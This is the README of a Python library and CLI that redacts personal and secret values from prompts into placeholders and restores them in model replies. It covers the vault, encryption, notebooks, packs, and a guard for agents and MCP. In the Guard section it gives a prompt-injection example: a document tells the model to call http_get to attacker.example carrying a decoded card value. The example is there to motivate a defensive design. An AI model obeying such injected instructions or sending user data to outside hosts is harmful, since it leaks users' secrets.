# `scikitplot.cleanprompt`

Replace sensitive values in a prompt with stable placeholders before sending it
to a language model, then put them back when the reply comes in.

The base tier is **pure standard library**. Importing this submodule pulls in no
third-party package at all, so adding it changes nothing about the import cost
or the failure surface of the rest of `scikitplot`.

> **Worked examples** live in the gallery at
> [`galleries/examples/cleanprompt`](../../galleries/examples/cleanprompt/):
> basics, a command-line reference with its edge cases, a Python API reference
> with its edge cases, a notebook and module walkthrough, moderate and
> advanced tours, and a recipe sheet for CI gates, batch passes and agent
> loops. Every snippet there is executed during the documentation build, so
> none of them can go stale quietly.

## Quick start

```python
from scikitplot.cleanprompt import Redactor, restore

redactor = Redactor()
result = redactor.redact(
    "Mail ada@example.com about the Acme deal, card 4242 4242 4242 4242",
    extra_terms=["Acme"],
)

result.text
# 'Mail [EMAIL-1] about the [CUSTOM-1] deal, card [CREDIT_CARD-1]'

result.summary()
# 'redacted 3 value(s): CREDIT_CARD=1, CUSTOM=1, EMAIL=1'

# ... send result.text to a model, get a reply back ...
restore(reply, result.vault).text
```

`result.text` is safe to transmit. `result.vault` is not — it holds the values
that were removed. Keep it on this machine and call `result.vault.clear()` when
you are done. Its `repr` reports counts, never values.

## Command line

Two equivalent entry points — the second goes through the project-wide CLI,
which forwards every argument verbatim:

```sh
python -m scikitplot.cleanprompt doctor
scikitplot cleanprompt doctor
```

The commands, grouped by what you are trying to do. Every one, with its
aliases, is listed by `python -m scikitplot.cleanprompt --help`; the list
below is grouped by task rather than counted, so it cannot drift out of step:

```sh
# the conversation: text in, paste the prompt, paste the answer back, end it
python -m scikitplot.cleanprompt encode "your text"           # aliases: clean, prompt
python -m scikitplot.cleanprompt decode "the model's answer"  # alias: restore
python -m scikitplot.cleanprompt forget --force               # alias: clear-vault

# see the whole thing work, in one command
python -m scikitplot.cleanprompt roundtrip "Ada Lovelace mailed ada@example.com"  # alias: demo

# look before you leap
python -m scikitplot.cleanprompt doctor --format json    # what is active, what is blind
python -m scikitplot.cleanprompt inspect "your text"     # dry run + suggestions
python -m scikitplot.cleanprompt kinds                   # the pattern library

# one-shot, scriptable
python -m scikitplot.cleanprompt redact  --in prompt.txt --vault v.json
python -m scikitplot.cleanprompt decode  --in reply.txt  --vault v.json
python -m scikitplot.cleanprompt scan    --in prompt.txt   # CI gate, exit 3 if found

# files, folders and teams
python -m scikitplot.cleanprompt packs                        # packs and formats
python -m scikitplot.cleanprompt batch project/ --out safe/   # a folder or zip
python -m scikitplot.cleanprompt plan --write team.plan.json  # pin a configuration

# models and agents
python -m scikitplot.cleanprompt ask --via "ollama run llama3" "your text"
python -m scikitplot.cleanprompt mcp --root ./project         # MCP over stdio
python -m scikitplot.cleanprompt skill                        # agent instructions

# interactive
python -m scikitplot.cleanprompt cli                       # paste-and-go session
python -m scikitplot.cleanprompt flask                     # browser interface
python -m scikitplot.cleanprompt docker --write ./ops      # container files
```

### The pair: `encode` and `decode`

`encode` turns your text into a prompt you can paste anywhere. `decode` turns
the answer back. Neither takes a path.

```console
$ python -m scikitplot.cleanprompt encode --ner <<'END'
Mustafa Kemal Atatürk[e] (c. 1881[f] – 10 November 1938) was a Turkish
field marshal who founded the Republic of Turkey. He's at ataturk@example.com.
END
[PERSON-1][e] (c. 1881[f] – 10 November 1938) was a [NORP-1]
field marshal who founded [GPE-1]. He's at [EMAIL-1].
vault: ~/.local/state/cleanprompt/vault.json (append, 4 value(s))
```

Standard output carries the redacted text and nothing else — that `vault:`
line is standard error, so `encode ... > prompt.txt` and `encode ... | pbcopy`
both get the text alone, and `-q` silences it.

Paste that into the chat. When the answer comes back, paste it at `decode`:

```console
$ python -m scikitplot.cleanprompt decode <<'END'
[PERSON-1] led the reforms, and [GPE-1] was proclaimed in 1923.
You can write to [EMAIL-1] for the archive.
END
Mustafa Kemal Atatürk led the reforms, and the Republic of Turkey was proclaimed in 1923.
You can write to ataturk@example.com for the archive.
```

`clean` and `prompt` are aliases of `encode`; `restore` is an alias of
`decode`. `redact` is the same pipeline with a named vault and a report of
what it removed — use it in scripts, where being explicit is the point.

### Ending a conversation: `forget`

`encode` keeps the removed values so `decode` can put them back, and it
appends, so they accumulate. When you are finished, delete them:

```console
$ python -m scikitplot.cleanprompt forget
would delete ~/.local/state/cleanprompt/vault.json
  it held 3 value(s): EMAIL=1, IPV4=1, PERSON=1
  re-run with --force to delete it
```

It reports and stops; `--force` goes through with it. The report names
categories and counts, never a value, so deciding whether to delete does not
put the data back on your screen.

One honest limit: this unlinks the file. On a journalling filesystem, on an SSD
with wear levelling, or if a backup ran in between, the bytes may outlive the
unlink. For values that must not be recoverable, encrypt the vault — then what
is on disk was never readable in the first place.

### When the model rewrites your placeholders

A reply does not come back byte-for-byte. Models lower-case tokens, swap the
hyphen for an underscore or a space, escape brackets for Markdown, and wrap
long lines — so `[EMAIL-1]` can arrive as any of these:

```
[email-1]   [EMAIL_1]   [EMAIL 1]   [EMAIL‑1]   \[EMAIL-1\]   [EMAIL\_1]   [EMAIL-
1]
```

The last-but-one is two of the others combined: a model writing `[EMAIL_1]`
inside Markdown escapes the underscore, because an unescaped one would open
emphasis.

All of them restore, and every repair is reported:

```console
$ cleanprompt decode "I mailed [EMAIL_1] and [EMAIL 2]."
I mailed ada@example.com and bob@example.com.
restored 2 placeholder(s); 2 repaired: [EMAIL_1] -> [EMAIL-1], [EMAIL 2] -> [EMAIL-2]
```

Only rewrites that resolve to a label your vault actually holds are acted on,
so ordinary prose is left alone — `[note 2]` and `[1]` are not placeholders and
are never touched. `--exact` turns the leniency off.

And when nothing resolves at all, it says so rather than reporting a quiet
zero:

```console
$ cleanprompt decode "Nothing useful here."
Nothing useful here.
restored 0 placeholder(s); 2 vault entr(y/ies) unused
  nothing was restored: check the reply still contains the placeholders as they were issued
```

### Surrogates: text the model will not rewrite

Better than repairing the damage is not inviting it. `--style surrogate`
substitutes consistent invented values instead of bracket tokens:

```console
$ cleanprompt encode --style surrogate --ner <<'END'
Ada Lovelace mailed ada@example.com about the Analytical Society.
Her card is 4242 4242 4242 4242.
END
Marion Holt mailed marion.holt@example.invalid about Northwind Logistics.
Her card is [CREDIT_CARD-1].
```

That reads as a sentence, which matters for two reasons. A model reasons better
about `Marion Holt` than about `[PERSON-1]`, and it stops commenting on the
redaction instead of answering. And there is nothing for it to normalise — no
model rewrites an ordinary name, so the whole class of damage above disappears.

`decode` reverses it exactly as before, with no extra flags — including a
stand-in the model re-cased or re-spaced (`DEAR MARION HOLT`, a name broken
across a line or with a non-breaking space), which is restored and listed in
the repair report. A stand-in the model *reformatted* (`+1-555-0100` for
`+1 555 0100`) or reworded is not restored: that is why a surrogate reply
you will act on deserves a read, and why placeholders stay the default.

**Credentials keep their placeholders**, as the card above shows. A
plausible-looking card number, account number or access key is a hazard rather
than a convenience: a person can mistake it for real, a system can act on it,
and by chance it could *be* real. `[CREDIT_CARD-1]` cannot be mistaken for
anything. Where a surrogate is generated it uses a reserved form that cannot
resolve — `example.invalid` for addresses and links, the `+1 555 0100`–`0199`
block for telephone numbers.

| | surrogated | keeps its placeholder |
|---|---|---|
| | `PERSON` `ORG` `GPE` `LOC` `FAC` `EMAIL` `PHONE` `URL` | `CREDIT_CARD` `IBAN` `SSN_US` `AWS_ACCESS_KEY` `JWT` `PRIVATE_KEY` `MAC` `IPV4` `IPV6` `NORP` |

`placeholder` stays the **default**, because a surrogate gives up the one thing
a bracket token has for free: being obviously not part of the document. Choose
surrogates for a prompt; keep placeholders for anything a person will read and
act on.

The style is part of the placeholder grammar, so a vault written one way cannot
be read the other — `decode` refuses rather than half-restoring.

### Encrypting the vault

`--encrypt` needs nothing installed. It works on any machine with a Python
interpreter, and the vault it writes opens on any other:

```console
$ python -m scikitplot.cleanprompt doctor --new-key
K7M2Q-4XTBH-9RJDN-PW3FS

$ export CLEANPROMPT_VAULT_KEY='K7M2Q-4XTBH-9RJDN-PW3FS'
$ python -m scikitplot.cleanprompt encode --encrypt -q "Mail ada@example.com"
mail [EMAIL-1]
$ python -m scikitplot.cleanprompt decode -q "I mailed [EMAIL-1]."
I mailed ada@example.com.
```

Run it at a terminal without setting the variable and you are asked for the
passphrase instead, which keeps it out of your shell history. Lose it and the
vault is unrecoverable — that is what it is for.

The file on disk holds no values:

```json
{
  "cipher": "cleanprompt-hmac-v1",
  "kdf": {"name": "scrypt", "salt": "…", "n": 16384, "r": 8, "p": 1},
  "entries": {"[EMAIL-1]": "KBjdVsuwD3H2txi59Fl2rZ/cGENClY77…"}
}
```

#### Which cipher

| `--cipher` | what it uses | needs |
|---|---|---|
| `portable` *(default)* | scrypt, then HMAC-SHA256 counter mode with encrypt-then-MAC | nothing |
| `fernet` | Fernet — AES-128-CBC with HMAC-SHA256 | `cryptography` |
| `auto` | `fernet` when installed, else `portable` | nothing |

`portable` is the default because the reason to encrypt a vault is usually that
it will outlive the moment, and a vault you can only open where a compiled
dependency happens to be installed has traded one risk for another.

**Being straight about what `portable` is.** It is the textbook composition —
a key-derivation function, separate keys for encryption and authentication, a
stream cipher from a pseudorandom function, and encrypt-then-MAC with the label
bound into the tag so entries cannot be swapped. It is not a reviewed
implementation of AES, and Fernet is the better primitive where you can have
it. `_vaultcrypt.py` sets out the construction step by step so it can be
checked rather than taken on trust, and `--cipher fernet` is one flag away.

Every parameter — the cipher name, the derivation function, the salt, the cost
— is written into the vault, so a change to the defaults here will not make
today's vaults unreadable.

### The vault, and where it lives

The vault holds the values that were removed. It is the only thing that can put
them back, and it is the one file here that must not leak.

You no longer name it. By default it goes to your platform's state directory —
`$XDG_STATE_HOME/cleanprompt/vault.json`, or `~/.local/state/cleanprompt/` when
that is unset, and `%LOCALAPPDATA%\cleanprompt\` on Windows. On Linux and
macOS the directory is created `0700` and the file `0600`. Windows has no such
permission bits: there the file has the access rules of its folder, and the
default folder is inside your user profile. `--encrypt` protects the content
on every platform.

**Not the working directory, deliberately.** A vault is clear text, and this
tool gets used inside checkouts. A `cleanprompt-vault.json` sitting in the
directory you happened to run from is one `git add .` away from committing the
exact values you were trying not to send anywhere.

Override it for one run with `--vault PATH`, or for a whole shell with
`CLEANPROMPT_VAULT`. `doctor` prints the resolved path.

#### Append or overwrite

```sh
--vault-mode append      # keep the placeholders a value already has
--vault-mode overwrite   # start a fresh vault
```

`clean` appends by default and `redact` overwrites by default, because they are
used for different things. Append is what a conversation wants: the same
address keeps the same placeholder in turn one and turn nine, and the vault
accumulates, so a reply quoting anything from any earlier turn still restores.

```console
$ cleanprompt clean -q "mail ada@example.com"
mail [EMAIL-1]
$ cleanprompt clean -q "cc bob@example.com"
cc [EMAIL-2]
$ cleanprompt clean -q "remind ada@example.com"
remind [EMAIL-1]          # same address, same placeholder, three runs later
```

Overwrite is for one-off work where the previous vault is finished with. It is
`redact`'s default so that the scripted, file-based workflow keeps behaving as
it always did.

One refusal worth knowing about: a vault written before this format recorded
placeholder categories cannot be appended to. Restoring from it still works.
Appending would renumber from `[KIND-1]` while the old vault already used that
label for something else, and merging the two would leave one placeholder
standing for two values — so it stops instead.

#### Several runs at once

An agent making parallel tool calls, or two terminals, may run `encode`
against the same vault at the same moment. Runs take turns: each holds a lock
on `vault.json.lock` from reading the vault to writing it back, so every value
still gets its own placeholder, and a run that has to wait says so. `forget`
takes the same lock, so an `encode` already in flight cannot write forgotten
values back. The vault is replaced in one step — written beside itself and
renamed — so nothing ever reads a half-written vault, and a crash or Ctrl-C
leaves the previous one intact. The `.lock` file holds no data and is left in
place on purpose.

### Giving it your text

Every command that takes text accepts it four ways. Use whichever suits the
text you have:

```sh
# 1. directly, for something short
python -m scikitplot.cleanprompt inspect "Mail ada@example.com about the deal"

# 2. from a file
python -m scikitplot.cleanprompt inspect --in prompt.txt

# 3. from a pipe
pbpaste | python -m scikitplot.cleanprompt inspect          # macOS
xclip -o | python -m scikitplot.cleanprompt inspect         # Linux

# 4. a heredoc — paste anything at all, no escaping
python -m scikitplot.cleanprompt inspect <<'END'
Mustafa Kemal Atatürk[e] (c. 1881[f] – 10 November 1938) was a Turkish
field marshal who founded the Republic of Turkey. He's at ataturk@example.com.
END
```

**Reach for the heredoc when the text is prose.** A shell reads `(`, `)`, `'`,
`;`, `&`, `|` and `$` before this program ever runs, so pasting a paragraph
straight onto the command line fails in the shell, not here:

```console
$ ... inspect --ner Mustafa Kemal Atatürk (c. 1881 – 1938) was a field marshal
bash: syntax error near unexpected token `('
```

Quoting the whole thing in `"..."` fixes the parentheses but not a `$` or a
backtick. `<<'END'` — with the delimiter quoted — disables every one of those
substitutions, so the text arrives exactly as you pasted it. For repeated
pastes, the interactive session is easier still:

```sh
python -m scikitplot.cleanprompt cli
```

Running a command with no text and no `--in` at a terminal reads standard
input, and says so rather than appearing to hang:

```console
$ python -m scikitplot.cleanprompt inspect
reading from standard input — paste your text, then press Ctrl-D on a blank line.
  other ways to pass text:
    scikitplot cleanprompt inspect "your text here"      # short text, one line
    scikitplot cleanprompt inspect --in notes.txt        # from a file
    scikitplot cleanprompt inspect <<'END'               # paste anything, no escaping
    ... your text ...
    END
```

### Option grammar

Long options are spelled in full. An abbreviation such as `--form` for
`--format` is refused — argparse would have accepted it and click never did, so
the same command line worked or failed depending on which library happened to
be installed.

Short aliases exist for the ones you type most:

| short | long | |
|---|---|---|
| `-h` | `--help` | |
| `-V` | `--version` | |
| `-i` | `--in` | read the text from a file |
| `-o` | `--out` | write the result to a file |
| `-f` | `--format` | `text`, `json`, `yaml`, `toml` |
| `-k` | `--kinds` | restrict detection to named kinds |
| `-q` | `--quiet` | suppress the diagnostics on stderr |

**`--` ends the options.** Everything after it is text, even when it begins
with a dash. This matters more here than in most tools, because the positional
argument is arbitrary prose — a prompt *about* command-line flags, a password
starting with a hyphen, a filename like `-rf`:

```sh
cleanprompt roundtrip -- "-rf is the flag I meant, mail ada@example.com"
cleanprompt inspect   -- "--secret=hunter2 goes to nobody"
```

Only the first `--` is consumed, so a `--` inside your text stays in your text.

Without it, a dash-leading argument is **refused rather than guessed at**:

```console
$ cleanprompt inspect "--secret is a@b.co"
error: unrecognised option '--secret is a@b.co'
  if that is your text and not an option, end the options with '--' first:
      cleanprompt inspect ... -- '--secret is a@b.co'
```

That is deliberate. Accepting it as text would mean a mistyped option name gets
redacted as if it were your prompt, while the option you meant is silently
never applied — the wrong failure for a tool that decides what leaves your
machine.

**An option *value* that starts with a dash** attaches with `=`:

```sh
cleanprompt redact --hide=-my-secret-flag --vault v.json "..."   # portable
cleanprompt redact --hide -my-secret-flag --vault v.json "..."   # may be refused
```

The attached form works in both frontends and is the POSIX-preferred spelling;
the separated form is accepted by click and refused by argparse.

### Exit status

What a script actually consumes:

| status | meaning |
|---|---|
| `0` | the command did what it was asked |
| `1` | a handled error: no vault, unreadable file, wrong passphrase, `--strict` found a placeholder the vault does not hold |
| `2` | a usage error: unknown option, unknown command, an abbreviation |
| `3` | `scan` only: sensitive values were present |
| `69` | an optional tier is required and is not installed |
| `130` | interrupted |
| `141` | the reader closed the pipe, as `| head` does |

The last one is why piping a long report is quiet:

```sh
cleanprompt kinds --format json | head -20     # no "Broken pipe" on stderr
cleanprompt doctor --format json | jq .healthy
```

### Seeing both halves: `roundtrip`

`redact` and `restore` are separate commands with a vault file between them,
which is right for real work and hides the part people want to see first — that
the values come *back*. `roundtrip` shows the whole loop in one command, with
nothing written to disk:

```console
$ python -m scikitplot.cleanprompt roundtrip --ner "Ada Lovelace mailed ada@example.com from 192.168.1.10."

1 · your text
    Ada Lovelace mailed ada@example.com from 192.168.1.10.

2 · what gets sent — copy this into the model
    [PERSON-1] mailed [EMAIL-1] from [IPV4-1].

3 · what was removed — kept on this machine, never sent
    placeholder  kind    count  detector
    -----------  ------  -----  ------------------
    [PERSON-1]   PERSON  1      ner:en_core_web_sm
    [EMAIL-1]    EMAIL   1      regex:EMAIL
    [IPV4-1]     IPV4    1      regex:IPV4

4 · a stand-in reply — NOT from a model; pass --reply to use a real one
    Of course. I have made a note of [PERSON-1], [EMAIL-1] and [IPV4-1], and I will follow up shortly.

5 · restored — the values are back
    Of course. I have made a note of Ada Lovelace, ada@example.com and 192.168.1.10, and I will follow up shortly.

round trip exact: yes
```

Stage 4 is a fixed string, not a model call, and is labelled as one every time.
Paste the real answer back with `--reply "..."` or `--reply-in reply.txt` and
stage 5 restores into that instead:

```sh
python -m scikitplot.cleanprompt roundtrip "Mail ada@example.com" \
    --reply "I have emailed [EMAIL-1] and copied the notes across."
# 5 · restored — the values are back
#     I have emailed ada@example.com and copied the notes across.
```

`--format json` gives the same five stages as a machine-readable document,
including `round_trip_exact` and `unresolved_placeholders`.

For real use, keep `redact` and `restore`: the vault is the thing that lets the
reply come back minutes or days later, in another process.

**Run `doctor` first.** It reports which detectors are live, which tiers are
installable, and what the current configuration cannot see — with the exact
command that fixes each gap. `--format text|json|yaml|toml`; `json` is the one
to script against.

Results go to standard output and diagnostics to standard error, so `redact`
composes in a pipe. The vault file is created owner-readable only, and
`--encrypt` encrypts its values with a key you supply in
`CLEANPROMPT_VAULT_KEY`.

### argparse or click

Both frontends render from one neutral command table, so the commands, options
and output are identical. Click is used when installed, argparse otherwise;
force either with `CLEANPROMPT_CLI_FRONTEND=argparse` or `--frontend`. If click
is installed but broken, the CLI falls back rather than failing — the base tier
must never be taken down by an optional convenience.

### What if nothing gets redacted?

That is a real answer, and the tool will not let it look like a clean bill of
health. Ordinary prose about people and places contains no email, phone or card
number, and names are only found by the optional `ner` tier. When something is
switched off, `doctor`, the session banner and the web page all say so, and a
zero-detection result is reported as an **alert**, never as "no sensitive values
detected".

Three ways forward without installing spaCy:

```sh
python -m scikitplot.cleanprompt inspect --in prompt.txt     # see the candidates
python -m scikitplot.cleanprompt redact --profile strict ... # enable TITLE_CASE
python -m scikitplot.cleanprompt redact --hide Turkey --hide Kemalism ...
```

## Notebooks, modules and any analysis file

A data-science artefact leaks differently from a paragraph, and the difference
is not covered by any pattern:

* **identifiers, not values** — `customer_ssn` holds no social-security number;
  it discloses that the dataset does;
* **structure, not content** — `/home/marion.holt/work/acme-churn/` names a
  person and a client project in nine tokens;
* **rendered data** — the code can be spotless while the output beneath it
  holds two hundred real rows.

Point `--in` at the file and it is read as what it is:

```console
$ cleanprompt encode --infer-roles --in churn.ipynb --out churn.clean.ipynb
vault: ~/.local/state/cleanprompt/vault.json (overwrite, 14 value(s))
read as notebook: binary=1, code=10, metadata=58, output=4, prose=3, traceback=4
  7 column name(s) hidden; 7 with an established role
    amount_1       <- role amount (inferred)
    id_1           <- role id (inferred)
    category_1     <- role category (inferred)
    ...
```

What goes to the model is still a notebook — same cells, same
`execution_count`, same ids — with the schema **renamed by role** rather than
replaced by brackets:

```python
# before
df = pd.read_parquet("/mnt/prod/exports/2026_q1_acme_customers.parquet")
df = df[["customer_ssn", "acct_balance_usd", "region_code", "churned"]]

# after
df = pd.read_parquet("/data/dataset_1.parquet")
df = df[["id_1", "amount_1", "category_1", "flag_1"]]
```

That is the whole point of the role. `[COLUMN-1]` is safe and useless, because
the model's advice depends on knowing which column is numeric, which is
categorical and which is a date. With the roles kept, the answer comes back
usable — and `decode` turns it into your own names:

```console
$ cleanprompt decode "Drop id_1 — it is an identifier. Log-transform amount_1 and one-hot category_1."
Drop customer_ssn — it is an identifier. Log-transform acct_balance_usd and one-hot region_code.
```

**Removed by default**, because each is data rather than description:

| what | why | keep it with |
|---|---|---|
| rendered outputs | `df.head()` *is* the rows; `value_counts()` *is* the segment names | `--keep outputs` |
| embedded figures | a chart of real data shows real axis labels | `--keep figures` |
| paths and URIs | they name the organisation, the environment and the analyst | `--keep paths` |

Tracebacks are kept and scanned instead — an error is the commonest reason to
ask for help, and it is mostly structure.

**How a column is found.** By syntax, never by a word list: `df['x']`,
`usecols=`, `rename(columns=)`, and names bound to a literal list
(`ID_COLUMNS = [...]`, used later as `drop(columns=ID_COLUMNS)`). Attribute
access is deliberately *not* a discovery site — `df.shape` is not a column —
but once a name is known it is rewritten everywhere, attribute access included.

**How a role is decided.** In three tiers, and the third is an admission:
`--columns name:role` is declared and always wins; a `parse_dates=` or
`astype({...})` in the file is observed; everything else is `field_n` and the
report says the role was not established. `--infer-roles` adds name-based
guessing and labels it `inferred`.

**What is refused rather than done.** A column called `type`, `count`, `id` or
`x` is *not* rewritten, and the report says so by name: rewriting every
occurrence would change code that has nothing to do with the dataset. Rename
the column, or hide it with `--hide`.

## Records, configs and whole folders: packs and formats

Patterns find a value by its shape. A record says what its values are in its
**keys** — `"mrn": "00412345"`, `DB_PASSWORD=...`, a `member_id` column — and
no pattern reads a key. Packs do.

```python
from scikitplot.cleanprompt import FluentCleanPrompt

with FluentCleanPrompt().packs("patient").materialize() as cleaner:
    safe = cleaner.encode_text(
        '{"mrn": "00412345", "email": "ann@example.com"}', "json"
    )
    safe.text  # '{"mrn": "[MRN-1]", "email": "[EMAIL-1]"}'
    cleaner.decode(safe.text)  # the original, byte for byte
```

**Packs** say *what* to hide in one domain — `personal`, `addressbook`,
`patient`, `finance`, `secrets`, `records`, `email`, `cloud`, and
`pandas`/`numpy`/`sklearn` for the column-naming sites of code. **Formats** say
*how* a file is read — CSV and TSV by header, JSON and JSON Lines by key,
`.env`/INI/YAML/mail/vCard as `key: value`, shell/JS/SQL/R by assignment,
Python by syntax tree, notebooks cell by cell, Word/Excel/PowerPoint by
extracting their text with the standard library, PDF through
`scikitplot.corpus`, zip member by member — and which packs suit them.

| Choose | Means |
| --- | --- |
| `.packs("auto")` *(default)* | each file's format picks its packs |
| `.packs("all")` | every pack |
| `.packs("addressbook")` | one domain (its requirements come with it) |
| `.packs("patient", "finance")` | any combination |

The plan is immutable, validated (every problem at once), and fingerprinted by
content: the same selection written in a different order has the same
fingerprint, and editing a pack it uses changes it. Setting one domain twice is
an error unless you say `conflict="replace"` or `conflict="extend"`.

```sh
python -m scikitplot.cleanprompt packs                   # what exists
python -m scikitplot.cleanprompt packs --show patient    # one in full
python -m scikitplot.cleanprompt batch project/ --dry-run -f json   # what it would hide; writes nothing
python -m scikitplot.cleanprompt batch project/ --out project_safe/
python -m scikitplot.cleanprompt batch project_safe/ --decode --out project_back/
python -m scikitplot.cleanprompt batch bundle.zip --out bundle.safe.zip --pack all
```

`batch` encodes every file a selected format reads into a mirror folder (or a
new zip) under one vault, so a patient number is `[MRN-1]` in the CSV, the
JSON and the Word note alike. What it will not do is as important:

- a file no selected format reads is **skipped**, and one that cannot be read
  safely — not UTF-8, JSON that does not parse, an archive member named
  `../x`, a nested zip — is **refused**; neither is written, and the run exits
  `1` when anything was refused;
- symbolic links are not followed, and `.git`, `__pycache__` and
  `.ipynb_checkpoints` are never entered;
- a JSON number stays a JSON number: a hidden one becomes a reserved negative
  number such as `-9900000001`, because `[MRN-1]` would leave a file no parser
  opens.
- a JSON string is also read as prose, so a `note` holding
  `password: hunter2` hides the password exactly as the same line in a text
  file would, and the file stays valid JSON.

Round-trip formats restore byte for byte; Office and PDF files become
`name.ext.txt` holding the redacted text, and decode restores that text.

`--dry-run` reports, per file, the status `batch` would give it and how many
values of each kind it would hide — kinds and counts only, never a value — and
writes nothing; its vault is thrown away. It exits `1` when a file would be
refused, so it can gate a folder in CI before anything is shared.

A CSV, TSV or JSON Lines file larger than the document limit is encoded in
pieces cut only between records, each piece seeded with the labels issued so
far; the output is the same as encoding the file at once. A single record
larger than the limit is still refused.

### Your own pack

A pack is data. Write one in YAML (needs PyYAML) or JSON (needs nothing):

```yaml
# hr.yaml
name: hr
version: 1
summary: Our HR identifiers.
requires: [personal]
fields:
  - names: [badge_id, employee_number]
    kind: EMPLOYEE
    role: id
patterns:
  - kind: EMPLOYEE
    pattern: '(?i)\bbadge\s*:?\s*(?P<value>EMP-\d{6})\b'
    intent: A badge number written with its label.
    examples_yes: ['badge: EMP-004121']
    examples_no: ['EMP-12']
```

```sh
python -m scikitplot.cleanprompt batch staff/ --out staff_safe/ --pack-file hr.yaml --pack hr
```

It is validated exactly like a built-in: unknown keys are errors, every
pattern's examples are **executed** before it is used, and a validator can only
be *named* from a fixed list (`luhn`, `iban_mod97`, `tckn`, `nhs_mod11`, `npi`,
`aba_routing`, `not_repeated_digit`) — a definition file can never run code.
The optional `value` group hides the value and keeps its label, so
`badge: [EMPLOYEE-1]` in a note and `[EMPLOYEE-1]` in a roster are the same
person. Redefining a built-in needs `--replace-builtins`.

A section you declare must have something in it: `fields: []` or a bare
`patterns:` is reported as an unfinished pack rather than read as "none".

**An example that looks like a real credential is written in pieces.** An
example may be a list of fragments, which are joined before the pattern is
tested:

```yaml
    examples_yes: [['sk_live_', '0123456789abcdefABCDEFGH']]
```

The pattern is checked against the two pieces joined, but the file never
contains the joined value. That matters as soon as the file is committed: a
positive example for a key pattern is exactly the string a secret scanner
blocks, and it cannot tell an example from a leak. The built-in `secrets` pack
is written this way throughout, and `packs --compile` refuses to build if any
built-in definition holds a whole value one of that pack's patterns accepts.

### With `scikitplot.corpus`

The two submodules work together and neither needs the other.
`redact_documents(docs, cleaner)` makes corpus documents safe before they are
embedded or indexed: every text field and every metadata string is redacted,
derived fields (tokens, embeddings, offsets) are dropped, and `doc_id` and
`content_hash` are recomputed from the safe text.
`register_corpus_readers()` lets corpus read `.docx`, `.xlsx` and `.pptx` with
cleanprompt's standard-library reader.

**Honest limit.** A field rule reads a key. A name in running prose —
"Patient Marion Holt, ..." — has no key. It is hidden when the same name was
hidden anywhere else in the batch or conversation (`remember`, on by default;
a folder is read twice so file order does not matter); otherwise use `--ner`
or `--hide`.

## A gate in front of any model: `Guard`, `ask`, agents

Whatever model you use — a hosted API, a local model, an agent framework, a
command-line client — the question is the same: *what text leaves this
machine?* A `Guard` answers it in one place, and needs nothing but the
function that calls your model:

```python
from scikitplot.cleanprompt import FluentCleanPrompt

with FluentCleanPrompt().packs("auto").guard() as guard:
    answer = guard.ask(prompt, call_model)  # call_model(str) -> str
    reply = guard.chat(messages, call_chat)  # every message guarded
    args = guard.decode_tool_arguments(
        tool_call.arguments, allow={"EMAIL"}
    )  # least privilege
    safe = guard.encode_object(
        tool_result
    )  # keys, numbers and text, as one JSON document
    for text in guard.decode_stream(client_stream):  # decode a streamed reply
        print(text, end="")
```

Asynchronous clients — most current SDKs and agent frameworks — get the same
operations, with no event-loop library required:

```python
answer = await guard.aask(prompt, call_model_async)  # async def (str) -> str
reply = await guard.achat(messages, call_chat_async)
async for text in guard.adecode_stream(client_async_stream):
    print(text, end="")
```

- **Checked, not just encoded.** `guard.outgoing()` encodes and then searches
  the result for every value removed so far. If one is still there it raises
  `LeakError` *before* your function is called: nothing is sent.
- **Remembered.** A value hidden once — a name from a CSV's `name` column — is
  hidden wherever it recurs, in prose no rule could read, and however it is
  written there: in capitals, broken across a line, with a non-breaking space,
  in full-width letters, with a curly apostrophe. Each writing gets its own
  placeholder, so the reply restores exactly what you wrote. Rewordings
  (`Holt, Marion`, `M. Holt`) are different strings and are not claimed; use
  `hide=` for those. `remember(False)` turns this off, and the check above then
  refuses the recurrence instead.
- **Streamed.** `StreamDecoder` never splits a label across chunks; any
  chunking decodes exactly like the whole reply.
- **Refused, not guessed.** A chat part that cannot be inspected (an image) is
  refused rather than sent.
- **Least privilege for tools.** A tool call is where decoded values leave
  again, and a page or document the model read can tell it to call
  `http_get("https://attacker.example/?c=[CREDIT_CARD-1]")`. So tool arguments
  are decoded with `decode_tool_arguments(args, allow={...})`, naming the kinds
  that tool may receive — none, for a network tool. A call that names any other
  kind is refused before the tool runs. `chat()` decodes a reply's text but
  leaves its tool calls encoded, for exactly this reason.
- **Safe to share.** One guard, cleaner or session can serve many threads —
  a web server's workers, `asyncio.to_thread` — and every value still gets
  exactly one label, so a reply never restores one person's value into
  another's text.

From the shell, put any command-line model behind the same gate. The prompt
goes to the command's standard input, encoded; the answer comes back decoded
as it streams; the values never touch disk; no shell is involved:

```sh
python -m scikitplot.cleanprompt ask --via "ollama run llama3" --in notes.txt
python -m scikitplot.cleanprompt ask --via "llm -m gpt-4o" --show-sent "Reply to ann@example.com"
```

For AI assistants and agents, `skill` prints an instruction file that tells
them to encode before anything leaves and decode what comes back:

```sh
python -m scikitplot.cleanprompt skill                          # print SKILL.md
python -m scikitplot.cleanprompt skill --write ~/.claude/skills # install it
```

### For any MCP agent: `cleanprompt mcp`

A standard-library MCP server (JSON-RPC over stdio) gives any MCP-capable
assistant or IDE the gate as tools — no code:

```json
{"mcpServers": {"cleanprompt": {"command": "python",
  "args": ["-m", "scikitplot.cleanprompt", "mcp", "--root", "/path/to/project"]}}}
```

| Tool | What the model receives |
| --- | --- |
| `cleanprompt_read_file` | the file's text, encoded — never the raw file |
| `cleanprompt_write_file` | a relative path and counts; values are restored *on disk* |
| `cleanprompt_encode_text` | encoded text, to pass on to another service |
| `cleanprompt_encode_folder` | per-file statuses of a safe copy |
| `cleanprompt_inspect` | counts by kind, for a file, a text or a folder (per file) |
| `cleanprompt_forget` | confirmation; the vault is dropped |

In MCP every tool result enters the model's context, so no tool returns a
removed value — there is deliberately no "decode" tool. Files are confined to
the `--root` folders (symbolic links resolved), an existing file is never
replaced unless `overwrite` is true, and the vault lives in memory for the
session only.

### A plan the whole team uses: `--plan`

```sh
python -m scikitplot.cleanprompt plan --pack patient --pack finance --write team.plan.json
python -m scikitplot.cleanprompt batch data/ --out safe/ --plan team.plan.json
python -m scikitplot.cleanprompt plan --check team.plan.json    # in CI: exit 1 when stale
```

A plan file fixes the packs, formats and rules, and carries a fingerprint of
the definitions they resolve to. If a pack changes — an upgrade, an edited
custom file — every `--plan` run is refused until someone reviews the change
and saves the plan again. `ask`, `batch` and `mcp` all accept it.

### Logs say what left, never what was removed

While a `Cleaner`, `Guard` or `Session` holds values, every log record from
this submodule is scrubbed of them — message, `extra=` fields and tracebacks.
